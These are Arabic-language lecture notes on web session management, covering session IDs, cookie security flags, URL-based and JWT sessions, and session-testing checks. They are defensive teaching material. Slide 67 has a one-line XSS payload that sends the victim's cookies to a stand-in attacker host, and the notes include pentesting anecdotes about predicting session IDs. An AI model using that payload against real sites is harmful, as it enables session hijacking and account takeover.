# ๐ ุงูุฌูุณุฉ 5: Session Management & Session IDs ุจุงูุชูุตูู + ุฃูุงู ุงูู Cookies
## Slides 62 โ 77

---

## ๐ Slide 62: ุนููุงู ุงููุณู - Session Management & Session IDs
### Session Management & Session IDs

ุฃููุงู ุจูู ูุง ุจุงุดุง ูู ุงูุฌูุณุฉ ุงูุฎุงูุณุฉ! ๐๏ธ

ุงูุฌูุณุฉ ุฏู ูู **ุฃูู ุฌูุณุงุช ุงูููุฑุณ ููู** ูุฃููุง ููููู ุงูุญุงุฌุฉ ุงููู ูู ุญุงุฌุฉ ูู ุงูู Web Security ุจุชุชูุญูุฑ ุญูุงูููุง: **ุงูุฌูุณุงุช (Sessions)**!

ูู ูููุช ุงูู Session Management ุตุญุ ูุชููู ุจุนุฏ ูุฏู ุงูู Session Hijacking ูุงูู Session Fixation ูุงูู CSRF ููู ุงููุฌูุงุช ุงููู ุฌุงูุฉ. ูุนูู ุงูุฌูุณุฉ ุฏู ูู **ุงูุฃุณุงุณ** ุงููู ููุจูู ุนููู ูู ุญุงุฌุฉ! ๐๏ธ

---

## ๐ Slide 63: ุชุนุฑูู ุงูู Session Management
### Session Management

### ุงูุชุนุฑูู ุงูุฃูุงุฏููู:
> ูู ุณูุงู ุชุทุจููุงุช ุงูููุจุ **ุฅุฏุงุฑุฉ ุงูุฌูุณุงุช (Session Management)** ูู ุนูููุฉ **ุฅูุดุงุก ูุตูุงูุฉ ูุชุฃููู** ุฌูุณุฉ ุงููุณุชุฎุฏู ุจุนุฏ ูุง ูุณุฌู ุฏุฎููู (ูุนูู ุจุนุฏ ุงูู Authentication).

### ุจุงููุตุฑู ูุฏู:
ุชุฎูู ุฅูู ุฑุญุช ููุฏู:
1. **ูุตูุช ุงูููุฏู** ูุนููุช Check-in โ ุฏู ุงูู **Authentication** (ุฃุซุจุช ูููุชู)
2. **ุงุณุชููุช ูุงุฑุช ุงูุฃูุถุฉ** โ ุฏู ุงูู **Session ID** (ูุนุฑูู ุงูุฌูุณุฉ)
3. **ูู ูุง ุชุฑูุญ ููุงู ูู ุงูููุฏู** (ุงููุทุนูุ ุงูฺููุ ุงููุณุจุญ) ุจุชูุฑู ุงููุงุฑุช ูุจูุนุฑููู ุฅูู ูุฒูู โ ุฏู ุงูู **Session Management** (ุฅุฏุงุฑุฉ ุงูุฌูุณุฉ)
4. **ููุง ุชุนูู Check-out** โ ุฏู ุงูู **Session Termination** (ุฅููุงุก ุงูุฌูุณุฉ)
5. ูู ุญุฏ **ุณุฑู ุงููุงุฑุช ุจุชุงุนู** โ ููุฏุฑ ูุฏุฎู ุฃูุถุชู ููุณุชุฎุฏู ูู ุญุงุฌุฉ ุจุงุณูู! โ ุฏู ุงูู **Session Hijacking** ๐

### ููู ุงูู Session Management ุถุฑูุฑูุ

**ุงูุณุจุจ ุงูุฌููุฑู: ุจุฑูุชูููู HTTP ุจุทุจูุนุชู Stateless!** ๐งโ

```
ูุนูู ุฅูู Statelessุ

ุงูู HTTP Server ุนูุฏู "ุฃูุฒูุงููุฑ" ุญุฑููุงู! 
ูู Request ุจููุฌููู ุจูุชุนุงูู ูุนุงู ูุฃูู ุฃูู ูุฑุฉ ูุดููู.
ูุด ุจููุชูุฑ ุฃู ุญุงุฌุฉ ูู ุงูู Request ุงููู ูุจูู!

ูุซุงู:
Request 1: "ุฃูุง ุฃุญูุฏุ ุนุงูุฒ ุฃุดูู ุงูู Dashboard"
Server: "ุงุชูุถู ูุง ุฃุญูุฏ!" โ (ูุจุนุฏูุง ูุณูู ููุฑุงู!)

Request 2: "ุนุงูุฒ ุฃุดูู ุงูู Profile ุจุชุงุนู"
Server: "ุฃูุช ููู ุฃุตูุงู!? ๐คจ ุณุฌู ุฏุฎูู ุงูุฃูู!"

Request 3: "ุฃูุง ุฃุญูุฏ ุชุงููุ ุนุงูุฒ ุฃุดูู ุงูู Profile"
Server: "ุงุชูุถู ูุง ุฃุญูุฏ!" โ (ูุจุนุฏูุง ูุณูู ุชุงูู!)
```

ุฏู ูุงู ููุฎูู ุงูุญูุงุฉ ูุณุชุญููุฉ - ุชุฎูู ุชุฏุฎู ุงูุจุงุณูุฑุฏ ูุน **ูู Click** ุนูู ุงููููุน! ๐ฑ

**ุงูุญู:** ุงุฎุชุฑุนูุง ุงูู **Session Management** ุนุดุงู ูุนูู "ุฐุงูุฑุฉ" ููุณูุฑูุฑ!

```
ูุน Session Management:
Request 1: "ุฃูุง ุฃุญูุฏ + ููุฒุฑ + ุจุงุณูุฑุฏ"
Server: "ุฃููุงู ูุง ุฃุญูุฏ! ุฎุฏ ุงูู Session ID ุฏู: SK8x92mP"
         (ูุฎุฒู ุนูุฏู: SK8x92mP = ุฃุญูุฏุ Adminุ ูุณุฌู ุฏุฎูู)

Request 2: "Session ID: SK8x92mP - ุนุงูุฒ ุงูู Profile"
Server: (ุจูุจุญุซ: SK8x92mP = ุฃุญูุฏ!) "ุงุชูุถู ูุง ุฃุญูุฏุ ุฏู ุงูู Profile ุจุชุงุนู" โ

Request 3: "Session ID: SK8x92mP - ุนุงูุฒ ุฃุบูุฑ ุงูุจุงุณูุฑุฏ"
Server: (ุจูุจุญุซ: SK8x92mP = ุฃุญูุฏ!) "ุชูุงู ูุง ุฃุญูุฏุ ุงุชูุถู ุบูุฑู" โ
```

### ุงูู Session ุจุชุญุชูู ุนูู ุฅููุ
ุงูู Session ุนุจุงุฑุฉ ุนู **ูุชุฑุฉ ุชูุงุนู ูุณุชูุฑ** ุจูู ุงููุณุชุฎุฏู ูุงูุชุทุจูู. ุงูุณูุฑูุฑ ุจูุฎุฒู ูููุง ุญุงุฌุงุช ุฒู:
- **ุญุงูุฉ ุชุณุฌูู ุงูุฏุฎูู** โ ูุณุฌู ุฏุฎูู ููุง ูุฃ
- **ูููุฉ ุงููุณุชุฎุฏู** โ ููู ูู (User ID)
- **ุงูุตูุงุญูุงุช** โ Admin, Editor, User
- **ุชูุถููุงุช** โ ุงููุบุฉ, ุงูุซูู, ุขุฎุฑ ุตูุญุฉ ุฒุงุฑูุง
- **ุจูุงูุงุช ูุคูุชุฉ** โ ูุญุชููุงุช ุงูู Shopping Cart, ูุชุงุฆุฌ ุจุญุซ

> **๐ก ูุนูููุฉ ุชูููุฉ:** ุนูู ุงูุณูุฑูุฑุ ุงูู Session Data ูููู ุชุชุฎุฒู ูู ุฃูุงูู ูุฎุชููุฉ:
> - **ุงูุฐุงูุฑุฉ (In-Memory)**: ุฃุณุฑุน ุจุณ ุจุชุถูุน ูู ุงูุณูุฑูุฑ ุงุชุฑุณุชุฑ
> - **ูุงุนุฏุฉ ุจูุงูุงุช**: ุฃุจุทุฃ ุจุณ Persistent
> - **Redis/Memcached**: ุญู ูุณุท - ุณุฑูุน ููููู ูุชุดูุฑ ุจูู ุณูุฑูุฑุงุช
> - **ุงูู Token ููุณู (JWT)**: Stateless - ุงูุณูุฑูุฑ ูุด ุจูุฎุฒู ุญุงุฌุฉ!

---

## ๐ Slide 64: ุฑุณู ุชูุถูุญู (Diagram)
### Visual Flow

ุงูุณูุงูุฏ ุฏู ูููุง **ุฑุณู ุชูุถูุญู** ุจููุฎุต ูู ุงููู ูููุงู ุจุตูุฑุฉ ูุฑุฆูุฉ:

```
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โ                    ๐ค ุงููุณุชุฎุฏู (Client)                   โ
โ                                                          โ
โ  1. ุจูุจุนุช Username + Password                            โ
โ     โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโบ                   โ
โ                                         ๐ฅ๏ธ ุงูุณูุฑูุฑ       โ
โ                                         โโโโโโโโโโโโโโโโ โ
โ                                         โ ุจูุชุญูู ูู    โ โ
โ  2. ุจูุณุชูู Session ID ูู Cookie          โ ุงูุจูุงูุงุช     โ โ
โ     โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ  โ              โ โ
โ                                         โ ุจูุนูู Sessionโ โ
โ  3. ูู Request ุจุนุฏ ูุฏู ุจูุจุนุช ุงูู Cookie   โ ุจูุฎุฒููุง     โ โ
โ     โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโบ  โ              โ โ
โ                                         โ ุจูุฑุจุท ุงูู ID  โ โ
โ  4. ุจูุณุชูู ุงูุฑุฏ ุงููุทููุจ                  โ ุจุงูุจูุงูุงุช   โ โ
โ     โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ  โโโโโโโโโโโโโโโโ โ
โ                                                          โ
โ  5. Logout ุฃู Timeout โ ุงูู Session ุจุชุชุฏูุฑ               โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
```

---

## ๐ Slide 65: ุฅูุดุงุก ุงูุฌูุณุฉ (Session Creation)
### 1 - Session Creation

### ุงูุฎุทูุฉ ุงูุฃููู: ููุง ุงููุณุชุฎุฏู ุจูุณุฌู ุฏุฎูู

```
๐ ุงูุฎุทูุงุช ุจุงูุชุฑุชูุจ:

1๏ธโฃ ุงููุณุชุฎุฏู ุจูุจุนุช Username + Password ููุณูุฑูุฑ
2๏ธโฃ ุงูุณูุฑูุฑ ุจูุชุญูู ูู ุงูุจูุงูุงุช ูู ูุงุนุฏุฉ ุงูุจูุงูุงุช
3๏ธโฃ ูู ุตุญ โ ุงูุณูุฑูุฑ ุจูุนูู Session ุฌุฏูุฏุฉ
4๏ธโฃ ุงูุณูุฑูุฑ ุจูููุฏ Session ID ูุฑูุฏ (Unique) ูุนุดูุงุฆู (Random)
5๏ธโฃ ุงูุณูุฑูุฑ ุจูุฎุฒู ุจูุงูุงุช ุงููุณุชุฎุฏู ูุฑุจูุทุฉ ุจุงูู Session ID
6๏ธโฃ ุงูุณูุฑูุฑ ุจูุจุนุช ุงูู Session ID ูููุชุตูุญ (ุนุงุฏุฉ ูู Cookie)
```

### ุงูู Session ID ูุงุฒู ูููู:

| ุงูุฎุงุตูุฉ | ูููุ | ูุซุงู ุตุญ โ | ูุซุงู ุบูุท โ |
|---------|------|----------|-----------|
| **ุทููู** | ุนุดุงู ุตุนุจ ุญุฏ ูุฎููู | `a7f329d4e8b1c5...` (128-bit+) | `12345` |
| **ุนุดูุงุฆู** | ุนุดุงู ููููุนุด ูุชุชููุน | Random bytes | Sequential (`session1`, `session2`) |
| **ูุฑูุฏ** | ุนุดุงู ููุชูุฑุฑุด ูุน ููุฒุฑ ุชุงูู | UUID/GUID | Timestamp ุจุณ |
| **ูุดูุฑ** | ุนุดุงู ูุญุชููุงุชู ูุชุชูุฑุฃุด | Cryptographically secure | `base64(username:role)` |

> **๐ด ูู ูุงูุน ุงูู Pentesting:** ูู ูุฑุฉ ูููุช ูููุน ุจูุนูู Session IDs ุจุงูุดูู ุฏู:
> ```
> Session 1: user_1_1699900001
> Session 2: user_2_1699900002  
> Session 3: user_3_1699900003
> ```
> ุฏู **Sequential** ู **Predictable**! ูุฏุฑุช ุฃุชููุน Session ID ุจุชุงุน ุฃู ููุฒุฑ ุชุงูู ุจูุฌุฑุฏ ุฅูู ุฃุนุฑู ุงูู User ID ูุงูููุช ุงูุชูุฑูุจู ุงููู ุณุฌู ููู ุฏุฎูู! ุณุฑูุช ุฌูุณุงุช ูุณุชุฎุฏููู ุชุงูููู ุจุฏูู ูุง ูููู ุนูุฏู ุจุงุณูุฑุฏูู! ๐
>
> **ุงูุญู ุงูุตุญ:**
> ```python
> import secrets
> session_id = secrets.token_hex(32)  # 64 ุญุฑู ุนุดูุงุฆู
> # ูุซุงู: "a7f329d4e8b1c5f6789012345678abcdef..."
> ```

---

## ๐ Slide 66: ุฅุฏุงุฑุฉ ุงูุฌูุณุฉ ุจุงุณุชุฎุฏุงู ุงูู Cookies
### 2 - Session Management with Cookies

### ุงูู Cookies ุจุชูุนุจ ุฏูุฑ ุฑุฆูุณู ูู ุฅุฏุงุฑุฉ ุงูุฌูุณุงุช. ุชุนุงููุง ูููู ูู ุญุงุฌุฉ!

### ุฅูู ุงููู ุจูุญุตู ุฎุทูุฉ ุจุฎุทูุฉ:

**ุงูุฎุทูุฉ 1: ุงูุณูุฑูุฑ ุจูุจุนุช ุงูู Session ID ูู ุงูุฑุฏ:**
```http
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=a1b2c3d4e5f6g7h8i9j0; Path=/; HttpOnly; Secure; SameSite=Lax
Content-Type: text/html

<!DOCTYPE html>
<html>
<body>Welcome, Ahmed!</body>
</html>
```

**ุงูุฎุทูุฉ 2: ุงููุชุตูุญ ุจูุดูู ุงูู `Set-Cookie` Header ูุจูุฎุฒู ุงูู Cookie:**
```
ุงููุชุตูุญ ุจูุญุชูุธ ุจููุง ูู ููู ุฎุงุต ุจุงููููุน ุฏู
ููุจููุฑููุงุด ูููุงูุน ุชุงููุฉ (Same-Origin Policy)
```

**ุงูุฎุทูุฉ 3: ูู Request ุจุนุฏ ูุฏูุ ุงููุชุตูุญ ุจูุจุนุช ุงูู Cookie ุชููุงุฆูุงู:**
```http
GET /dashboard HTTP/1.1
Host: example.com
Cookie: PHPSESSID=a1b2c3d4e5f6g7h8i9j0

GET /profile HTTP/1.1
Host: example.com
Cookie: PHPSESSID=a1b2c3d4e5f6g7h8i9j0

POST /settings HTTP/1.1
Host: example.com
Cookie: PHPSESSID=a1b2c3d4e5f6g7h8i9j0
```

**ุงูู Cookie ููุงู ุจุชุชุธุจุท ุจู Security Attributes:**
```
HttpOnly  โ ุจุชููุน JavaScript ูู ูุฑุงุกุชูุง
Secure    โ ุจุชุชุจุนุช ุนูู HTTPS ุจุณ
SameSite  โ ุจุชุชุญูู ูู ุฅุฑุณุงููุง ูุน ุทูุจุงุช ูู ููุงูุน ุชุงููุฉ
```

> **๐ก ุงููุฑู ุจูู Session Cookie ู Persistent Cookie:**
> - **Session Cookie**: ุจุชุชูุณุญ ููุง ุชููู ุงููุชุตูุญ (ููููุงุด `Expires` ุฃู `Max-Age`)
> - **Persistent Cookie**: ุจุชูุถู ููุฌูุฏุฉ ูุญุฏ ุชุงุฑูุฎ ูุนูู (ูููุง `Expires` ุฃู `Max-Age`)
> 
> ุงูู "Remember Me" checkbox ุจูุญูู ุงูู Session Cookie ูู Persistent Cookie ุนุดุงู ููุง ุชุฑุฌุน ุชุงูู ุชููู ูุณู ูุณุฌู ุฏุฎูู!

---

## ๐ Slide 67: ุฏูุฑ ุงูู Session IDs
### 3 - Role of Session IDs

### ุงูู Session ID ูู ุงูุญููุฉ ุงูุฑุฆูุณูุฉ!

> ุงูู Session ID ูู **ุงูุฑุงุจุท ุงููุญูุฏ** ุจูู ุงููุชุตูุญ ุจุชุงุนู (Client) ูุจูุงูุงุช ุฌูุณุชู ุนูู ุงูุณูุฑูุฑ (Server-Side Session Data).

ุชุฎูู ูุฏู:
```
ุงููุชุตูุญ ุจุชุงุนู:                    ุงูุณูุฑูุฑ:
โโโโโโโโโโโโโโโโ                  โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โ Cookie:      โ    โโโโโโโโบ      โ Session Store:              โ
โ ID = xK9m2p  โ                  โ                             โ
โโโโโโโโโโโโโโโโ                  โ xK9m2p โ {                  โ
                                  โ   user: "ahmed",            โ
ูููุด ุฃู ุจูุงูุงุช                    โ   role: "admin",            โ
ุชุงููุฉ ุนูุฏู!                       โ   login_time: "10:30",      โ
                                  โ   cart: ["item1", "item2"]  โ
                                  โ }                           โ
                                  โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
```

### ููู ูุงุฒู ูููู ุขููุ

ูุฃู **ููู ูุนุงู ุงูู Session ID = ููู ูุณุฌู ุงูุฏุฎูู!** ๐

ูุด ููู ุงูุจุงุณูุฑุฏ ุฅูู. ูุด ููู ุงูู 2FA ุนุฏูุชูุง ููุง ูุฃ. ูู ุงูููุงุฌู ุนูุฏู ุงูู Session ID ุจุชุงุนู **= ูู ุจูู ุฃูุช!**

```
ุณููุงุฑูู Session Hijacking:
1. ุฃุญูุฏ ุจูุณุฌู ุฏุฎูู โ Session ID = xK9m2p
2. ุงูููุงุฌู ุจูุณุฑู ุงูู ID ุฏู (ุนู ุทุฑูู XSS ูุซูุงู)
3. ุงูููุงุฌู ุจูุญุท ุงูู ID ูู ูุชุตูุญู:
   Cookie: PHPSESSID=xK9m2p
4. ุงูุณูุฑูุฑ ุจูุดูู ุงูู ID ุฏู โ "ุฃููุงู ุฃุญูุฏ!"
5. ุงูููุงุฌู ุจูู ุฃุญูุฏ! ูู ุบูุฑ ูุง ูุนุฑู ุงูุจุงุณูุฑุฏ! ๐
```

ุนุดุงู ูุฏู ุงูู Session ID **ูุงุฒู ูููู Unpredictable ู Securely Stored**!

> **๐ด ูู ูุงูุน ุงูู Pentesting:** ูู ูููุช ุซุบุฑุฉ XSS ูู ูููุนุ ุฃูู ุญุงุฌุฉ ุจุฌุฑุจูุง ูู ุณุฑูุฉ ุงูู Session Cookie:
> ```javascript
> // XSS Payload ูุณุฑูุฉ ุงูู Session
> <script>
> new Image().src = "https://attacker.com/steal?c=" + document.cookie;
> </script>
> ```
> ูู ุงูู Cookie ุนูููุง `HttpOnly` โ ุงูููุฏ ุฏู ูุด ููุดุชุบู! ๐ก๏ธ
> ูู ูููุด `HttpOnly` โ ุณุฑูุช ุงูุฌูุณุฉ ูู ุซุงููุฉ! ๐

---

## ๐ Slide 68: ุงูู Session IDs ุจุงูุชูุตูู
### Session IDs

### ุงูุชุนุฑูู:
> **Session IDs** ูู ูุนุฑููุงุช ูุฑูุฏุฉ ุจุชุชุนูู ูุฌูุณุฉ ุงููุณุชุฎุฏู ููุง ุจูุชูุงุนู ูุน ุชุทุจูู ุงูููุจ. ุงููุนุฑููุงุช ุฏู ุจุชุณุงุนุฏ ุงูุชุทุจูู ูุชุนุฑู ุนูู ุงููุณุชุฎุฏู ุนุจุฑ ุทูุจุงุช ูุชุนุฏุฏุฉ ููุญุงูุธ ุนูู ุงุณุชูุฑุงุฑูุฉ ุชุฌุฑุจุชู.

### ุฎุตุงุฆุต ุงูู Session ID ุงูุขูู:

```
โ Session ID ุขูู:
โโโโโโโโโโโโโโโโโ
โข Entropy ุนุงูู (128-bit ุฃู ุฃูุชุฑ)
โข ููููุฏ ุจู Cryptographically Secure PRNG
โข ุทููู ููุงูุฉ (32+ ุญุฑู)
โข ูููููุด ูุนูููุงุช ุนู ุงููุณุชุฎุฏู
โข ุจูุชุบูุฑ ุจุนุฏ ูู Login (Session Regeneration)
โข ููู ููุช ุงูุชูุงุก (Expiration)

โ Session ID ุถุนูู:
โโโโโโโโโโโโโโโโโ
โข Sequential (1, 2, 3, ...)
โข ุจูุญุชูู ุนูู ุงุณู ุงููุณุชุฎุฏู (user=ahmed)
โข ูุตูุฑ (4-8 ุญุฑูู)
โข ูุจูุชุบูุฑุด ุจุนุฏ ุงูู Login
โข Timestamp-based (ูููู ูุชุชููุน)
```

### ุงูุชูุฏูุฏุงุช:
- **Session Hijacking**: ุงูููุงุฌู ุจูุณุฑู ุงูู Session ID โ ุจูุณุชุฎุฏูู ูุฃูู ุงููุณุชุฎุฏู
- **Session Fixation**: ุงูููุงุฌู ุจููุฑุถ Session ID ูุนูู ุนูู ุงูุถุญูุฉ โ ุงูุถุญูุฉ ุจุชุณุฌู ุฏุฎูู ุจูู โ ุงูููุงุฌู ุจูุณุชุฎุฏู ููุณ ุงูู ID
- **Session Prediction**: ุงูู Session ID ุถุนูู ููุงุจู ููุชููุน โ ุงูููุงุฌู ุจูุฎููู

---

## ๐ Slide 69: ุฃููุงุน ุชูููุฐ ุงูู Session ID - ุงูุฌุฒุก ุงูุฃูู
### Session ID Implementation: Cookie-Based & URL-Based

### 1๏ธโฃ Cookie-Based Session IDs (ุงูุฃูุซุฑ ุดููุนุงู ูุฃูุงูุงู โ)

```http
# ุงูุณูุฑูุฑ ุจูุจุนุช:
Set-Cookie: session_id=a7f329d4e8b1c5f6; HttpOnly; Secure; SameSite=Lax

# ุงููุชุตูุญ ุจูุจุนุช ูุน ูู Request:
Cookie: session_id=a7f329d4e8b1c5f6
```

**ุงููููุฒุงุช:**
- โ ุงููุชุตูุญ ุจูุจุนุชูุง **ุชููุงุฆูุงู** - ุงููุจุฑูุฌ ูุด ูุญุชุงุฌ ูุนูู ุญุงุฌุฉ
- โ ููุฏุฑ ูุญูููุง ุจู **Security Flags** (HttpOnly, Secure, SameSite)
- โ ูุด ุจุชุธูุฑ ูู ุงูู **URL** (ุนูุณ ุงูุทุฑููุฉ ุงูุชุงููุฉ)
- โ ูุด ุจุชุชุฎุฒู ูู **Browser History**
- โ ูุด ุจุชุธูุฑ ูู **Server Logs**

**ุงูุนููุจ:**
- โ ูููู ุชุชุณุฑู ูู ููู **XSS** ููููุด HttpOnly
- โ ูููู ุชุชุจุนุช ูู **CSRF Attack** ูู ูููุด SameSite

### 2๏ธโฃ URL-Based Session IDs (ุฎุทูุฑ ุฌุฏุงู! โ)

```
https://example.com/dashboard?sessionid=abc123
https://example.com/profile;jsessionid=abc123
```

**ููู ุฎุทูุฑ ุฌุฏุงูุ 5 ุฃุณุจุงุจ:**

| ุงููุดููุฉ | ุงูุดุฑุญ |
|---------|-------|
| **Browser History** | ุงูู Session ID ุจูุชุฎุฒู ูู ุชุงุฑูุฎ ุงููุชุตูุญ - ุฃู ุญุฏ ูุณุชุฎุฏู ุงูุฌูุงุฒ ููุฏุฑ ูุดููู |
| **Referer Header** | ูู ุถุบุทุช ุนูู ูููู ุฎุงุฑุฌูุ ุงููููุน ุงูุฌุฏูุฏ ููุดูู ุงูู URL ุงููุงูู (ููู ุงูู Session ID!) ูู ุงูู Referer Header |
| **Server Logs** | ุงูู URLs ุจุชุชุณุฌู ูู Log files - ูุนูู ุงูู Session ID ูุชุฎุฒู ูู Plain Text ูู ูููุงุช ุงูู Logs |
| **Link Sharing** | ูู ุนููุช Copy ููู URL ูุจุนุชู ูุตุงุญุจู - ุณุฑูุช ุฌูุณุชู ุจุฏูู ูุง ุชุญุณ! |
| **Proxy Logs** | ุฃู Proxy ูู ุงููุต (ุดุฑูุชู ูุซูุงู) ููุดูู ุงูู Session ID |

> **๐ด ูุตุฉ ุญููููุฉ ูู ุงูู Pentesting:** ููุช ุจุฎุชุจุฑ ุชุทุจูู ูุดุฑูุฉ ูุจูุฑุฉุ ููููุช ุฅููู ุจูุณุชุฎุฏููุง URL-Based Sessions. ุงูููุธููู ูุงููุง ุจูุจุนุชูุง ููููุงุช ูุจุนุถ ุนูู Slack ุนุดุงู ูุดูุฑูุง ุตูุญุงุช ูู ุงูุชุทุจูู ุงูุฏุงุฎูู. ูู ูููู ูุงู ููู ุงูู Session ID! ๐ฑ ูุนูู ุฃู ููุธู ุงุณุชูู ูููู ูุงู ููุฏุฑ ูุฏุฎู ุจุฌูุณุฉ ุงูููุธู ุงููู ุจุนุชูููู - ููุนูู ุฃู ุญุงุฌุฉ ุจุงุณูู!

---

## ๐ Slide 70: ุฃููุงุน ุชูููุฐ ุงูู Session ID - ุงูุฌุฒุก ุงูุชุงูู
### Session ID Implementation: Token-Based & Headers

### 3๏ธโฃ Token-Based Sessions (ุญุฏูุซ ููุชุทูุฑ)

ุงูุทุฑููุฉ ุฏู ุจูุช **ุดุงุฆุนุฉ ุฌุฏุงู** ูู ุชุทุจููุงุช ุงูู APIs ูุงูู Single Page Applications (SPAs).

**ุงูููุฑุฉ:** ุจุฏู ูุง ุงูุณูุฑูุฑ ูุฎุฒู ุงูู Session Data ุนูุฏูุ ุจูุญุทูุง ูููุง **ุฌูู ุงูู Token ููุณู**!

ุฃุดูุฑ ูุซุงู: **JWT (JSON Web Token)**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyIjoiYWhtZWQiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE2OTk5MDAwMDB9.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**ุฅุฒุงู ุจูุชุฎุฒูุ**
- ูู `localStorage` ุฃู `sessionStorage` ูู ุงููุชุตูุญ
- ุฃู ูู `Cookie` (ูุฏู ุฃุฃูู)

**ุฅุฒุงู ุจูุชุจุนุชุ**
```http
GET /api/profile HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

**ุงููููุฒุงุช:**
- โ **Stateless**: ุงูุณูุฑูุฑ ูุด ูุญุชุงุฌ ูุฎุฒู ุญุงุฌุฉ โ ุฃุณุฑุน ูุฃุณูู ูู ุงูุชูุณุน (Scalability)
- โ Cross-Domain: ุจูุดุชุบู ุจุณูููุฉ ุจูู Domains ูุฎุชููุฉ
- โ ุจูุญุชูู ุนูู ูุนูููุงุช ุงููุณุชุฎุฏู ุฌูุงู

**ุงูุนููุจ:**
- โ ููููุนุด ูุชูุบู ุจุณูููุฉ (ูุฃู ุงูุณูุฑูุฑ ูุด ุจูุฎุฒูู - ูุฑุชุจุท ุจุชูููุช ุงูุงูุชูุงุก)
- โ ูู ุงุชุณุฑูุ ุงูููุงุฌู ููุฏุฑ ูุณุชุฎุฏูู ูุญุฏ ูุง ููุชูู
- โ ุญุฌูู ุฃูุจุฑ ูู Session ID ุนุงุฏู

### 4๏ธโฃ Session ID in Custom Headers (ูุชูุฏู)

ุจุนุถ ุงูุชุทุจููุงุช (ุฎุตูุตุงู ุงูู RESTful APIs) ุจุชุณุชุฎุฏู **Custom Headers**:
```http
GET /api/data HTTP/1.1
X-Session-ID: abc123def456
X-Auth-Token: xyz789
```

**ุงูููุฒุฉ:** ุงูู Session ID ูุด ูู ุงูู URL ููุด ูู Cookie ุนุงุฏูุฉ โ ุฃุตุนุจ ูุชุณุฑู ูู ุจุนุถ ุงููุฌูุงุช.

**ุฌุฏูู ููุงุฑูุฉ ุดุงููุฉ:**

| ุงูุทุฑููุฉ | ุงูุฃูุงู | ุงูุงุณุชุฎุฏุงู | ุงูู Scalability |
|---------|--------|----------|----------------|
| **Cookie-Based** | ๐ข (ูุน Flags) | ุงูุฃูุซุฑ ุดููุนุงู | ูุชูุณุท |
| **URL-Based** | ๐ด ุฎุทูุฑ | ูุฏูู ุฌุฏุงู | ูุชูุณุท |
| **Token-Based (JWT)** | ๐ก (ูุนุชูุฏ) | APIs & SPAs | ๐ข ููุชุงุฒ |
| **Custom Headers** | ๐ข | APIs | ๐ข ููุชุงุฒ |

---

## ๐ Slide 71: ุฌุฏูู ุงุฎุชุจุงุฑุงุช ุงูู Session Management
### Session Management Testing (WSTG-SESS)

ุฒู ูุง ุงูู Authentication ุนูุฏูุง ุงุฎุชุจุงุฑุงุช WSTG-ATHNุ ุงูู Session Management ููุงู ุนูุฏูุง ูุฌููุนุฉ ุงุฎุชุจุงุฑุงุช ุฎุงุตุฉ:

### ุฌุฏูู ุงูุงุฎุชุจุงุฑุงุช:

| ุงูุงุฎุชุจุงุฑ | ุงููุตู | ุฅูู ุงููู ุจูุฏูุฑ ุนููู |
|----------|-------|---------------------|
| **Testing for Session Management Schema** | ุงูุชุญูู ูู ุฅู ุงูู Session IDs ุจุชุชุฎุฒู ุจุดูู ุขูู ููุด ูููู ุชุชููุน ุฃู ุชุชุฎูู | ูู ุงูู ID ุนุดูุงุฆู ููุงูุฉุ ูู ุจูุชุบูุฑ ุจุนุฏ ุงูู Loginุ |
| **Testing for Cookie Attributes** | ูุญุต ุฅุนุฏุงุฏุงุช ุงูู Cookies (HttpOnly, Secure, SameSite) | ูู ุงูู Flags ุงูุฃูููุฉ ููุฌูุฏุฉุ |
| **Testing for Session Fixation** | ุชูููู ูู ุงูููุงุฌู ููุฏุฑ ูุญุฏุฏ ุฃู ูุชููุน Session ID **ูุจู** ูุง ุงููุณุชุฎุฏู ูุณุฌู ุฏุฎูู ููุฌุจุฑู ูุณุชุฎุฏูู | ูู ุงูู ID ุจูุชุฌุฏุฏ ุจุนุฏ ุงูู Loginุ |
| **Testing for Session Expiration** | ุงูุชุฃูุฏ ุฅู ุงูุฌูุณุงุช ุจุชูุชูู ุจุนุฏ ูุชุฑุฉ ูู ุนุฏู ุงููุดุงุท ุฃู ููุง ุงููุณุชุฎุฏู ูุนูู Logout | ูู ุงูู Session ุจุชุชุฏูุฑ ูุนูุงู ุนูู ุงูุณูุฑูุฑ ุจุนุฏ Logoutุ |
| **Testing for Session Timeout** | ุชูููู ูู ุงูุฌูุณุงุช ูุชุธุจุทุฉ ุชูุชูู ุจุนุฏ ูุชุฑุฉ ูุนูููุฉ | ูู ุงูุฌูุณุฉ ุจุชูุชูู ุจุนุฏ 30 ุฏูููุฉ ูุซูุงู ูู ุนุฏู ุงููุดุงุทุ |

> **๐ก ูุตูุญุฉ ุนูููุฉ:** ููุง ุชุจุฏุฃ Pentest ุฌุฏูุฏุ ุฃูู ุญุงุฌุฉ ุชุนูููุง ุจุนุฏ ูุง ุชุณุฌู ุฏุฎูู ูู ุฅูู ุชูุชุญ **Burp Suite** ูุชุจุต ุนูู ุงูู **Set-Cookie** Header ูู ุฃูู Response. ุฏู ูููููู ููุฑุงู ุงููููุน ุงุณุชุฎุฏู ุฅูู ูู ุงูู Session Management ููู ููู ูุดุงูู ุฃูููุฉ ุธุงูุฑุฉ.
>
> ```http
> # ุจุชุจุต ุนูู ุฏู:
> Set-Cookie: session=abc123
> # ูุจุชุณุฃู ููุณู:
> # 1. ููู ุงูู HttpOnly? โ
> # 2. ููู ุงูู Secure? โ  
> # 3. ููู ุงูู SameSite? โ
> # 4. ุงูู ID ูุตูุฑ (6 ุญุฑูู ุจุณ)! โ
> # 5. ูููุด Path ูุญุฏุฏ! โ
> # = 5 Findings ูู ุฃูู ูู ุฏูููุฉ! ๐ฏ
> ```

---

